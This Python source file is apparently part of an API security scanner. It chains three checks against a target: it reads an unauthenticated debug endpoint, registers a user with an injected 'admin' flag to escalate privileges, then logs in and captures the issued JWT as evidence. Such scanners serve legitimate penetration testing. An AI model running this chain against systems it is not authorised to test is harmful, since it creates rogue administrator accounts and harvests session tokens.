#!/usr/bin/env python3
"""
Enhanced JWT and Mass Assignment Scanner
Checks for combined vulnerabilities including:
- Debug endpoint information exposure
- Mass assignment privilege escalation
- JWT token theft and misuse
"""

import requests
import time
import jwt
from typing import Dict, List, Optional, Any
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class JWTMassAssignScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("jwt_mass_assign")
        self.target = None
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, 
             headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, 
             context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        self.base_url = url
        self.target = url
        vulnerabilities = []
        
        try:
            # Step 1: Check debug endpoint exposure
            debug_url = f"{url}/users/v1/_debug"
            debug_resp = requests.get(
                debug_url,
                timeout=5
            )
            
            initial_users = []
            initial_admin_count = 0
            if debug_resp.status_code == 200:
                debug_data = debug_resp.json()
                initial_users = debug_data.get("users", [])
                initial_admin_count = len([u for u in initial_users if u.get("admin") == True])
                
                # Capture evidence of debug endpoint exposure
                debug_req, debug_res = self.capture_transaction(
                    debug_resp,
                    auth_state={"auth_type": "none"},
                    correlation_id=str(time.time())
                )
                
                vulnerabilities.append({
                    "type": "DEBUG_ENDPOINT_EXPOSURE",
                    "severity": "CRITICAL",
                    "detail": "Debug endpoint exposes sensitive user information without authentication",
                    "evidence": {
                        "request": debug_req,
                        "response": debug_res,
                        "exposed_users": len(initial_users)
                    }
                })
            
            # Step 2: Attempt mass assignment privilege escalation
            test_payload = {
                "username": f"test_admin_{int(time.time())}",
                "password": "test123",
                "email": f"test_{int(time.time())}@admin.me",
                "admin": True  # Attempting privilege escalation
            }
            
            register_headers = {"Content-Type": "application/json"}
            register_resp = requests.post(
                f"{url}/users/v1/register",
                json=test_payload,
                headers=register_headers,
                timeout=5
            )
            
            # Capture evidence of registration attempt
            register_req, register_res = self.capture_transaction(
                register_resp,
                auth_state={"auth_type": "none"},
                correlation_id=str(time.time())
            )
            
            if register_resp.status_code == 200:
                # Step 3: Verify privilege escalation success
                verify_resp = requests.get(debug_url, timeout=5)
                if verify_resp.status_code == 200:
                    verify_data = verify_resp.json()
                    final_users = verify_data.get("users", [])
                    final_admin_count = len([u for u in final_users if u.get("admin") == True])
                    
                    # Check if our admin user was created
                    if final_admin_count > initial_admin_count:
                        vulnerabilities.append({
                            "type": "MASS_ASSIGNMENT_PRIVILEGE_ESCALATION",
                            "severity": "CRITICAL",
                            "detail": "Successfully created admin user through mass assignment",
                            "evidence": {
                                "request": register_req,
                                "response": register_res,
                                "initial_admin_count": initial_admin_count,
                                "final_admin_count": final_admin_count,
                                "payload": test_payload
                            }
                        })
                        
                        # Step 4: Attempt to login and obtain JWT
                        login_payload = {
                            "username": test_payload["username"],
                            "password": test_payload["password"]
                        }
                        
                        login_resp = requests.post(
                            f"{url}/users/v1/login",
                            json=login_payload,
                            headers=register_headers,
                            timeout=5
                        )
                        
                        # Capture evidence of login attempt
                        login_req, login_res = self.capture_transaction(
                            login_resp,
                            auth_state={"auth_type": "none"},
                            correlation_id=str(time.time())
                        )
                        
                        if login_resp.status_code == 200:
                            login_data = login_resp.json()
                            if "auth_token" in login_data:
                                vulnerabilities.append({
                                    "type": "JWT_TOKEN_EXPOSURE",
                                    "severity": "HIGH",
                                    "detail": "Successfully obtained JWT token for privileged account",
                                    "evidence": {
                                        "request": login_req,
                                        "response": login_res,
                                        "token": login_data["auth_token"],
                                        "related_vulns": [
                                            "Token Theft",
                                            "Token Replay",
                                            "Session Fixation",
                                            "API Misconfiguration (CORS, Headers, CSRF)"
                                        ]
                                    }
                                })
                
        except requests.RequestException as e:
            self.logger.error(f"Error in JWT mass assignment check: {str(e)}")
            
        return vulnerabilities

# Keep the scan function for backward compatibility
scan = JWTMassAssignScanner().scan